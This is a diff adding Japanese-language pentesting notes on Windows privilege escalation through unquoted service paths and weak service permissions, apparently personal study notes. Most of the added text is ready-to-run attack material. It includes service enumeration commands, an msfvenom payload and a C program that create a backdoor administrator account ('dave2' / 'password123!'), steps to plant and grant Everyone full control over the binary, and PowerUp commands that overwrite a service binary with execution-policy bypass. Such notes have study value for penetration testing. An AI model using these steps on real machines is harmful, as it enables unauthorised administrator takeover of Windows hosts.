@@ -1,9 +1,105 @@
 # 脆弱なサービスを悪用したPrivilege Escalation
 
-## インストールされているプログラムの列挙
+# 引用符で囲まれていないサービスの列挙
+
+```
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+```
+
+```
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                                "
+```
+
+## ペイロードの作成
+
+### msfvenom
+
+```
+msfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe
+```
+
+### C++でペイロードを作成
+
+```c++
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+コンパイル
+
+```
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+### ペイロードのターゲットパスに配置
+
+```
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+```
+
+```
+mv .\Devservice.exe '\Program Files\Development Files\'
+```
+
+### ペイロードの権限を変更
+
+```
+icacls 'C:\Program Files\Development Files\Devservice.exe' /grant Everyone:F
+```
+
+### サービスの停止と起動
+
+```
+Start-Service <サービス名>
+Stop-Service <サービス名>
+```
+
+## PowerUp.ps1で自動列挙
+
+```
+powershell -ep bypass
+. .\PowerUp.ps1
+```
+
+### 引用符で囲まれていないパスを列挙
+
+```
+Get-UnquotedService
+```
+
+### ペイロードの書き換え
+
+```
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+```
+
+### サービスの再起動
+
+```
+Restart-Service GammaService
+```
+
+# インストールされているプログラムの列挙
 
 ```
 wmic product get name
+```
+
+# スケジュールされたタスク
+
+## タスクの列挙
+
+```
+schtasks /query /fo LIST /v
 ```
 
 # Druva inSync Windows クライアントのローカル権限昇格
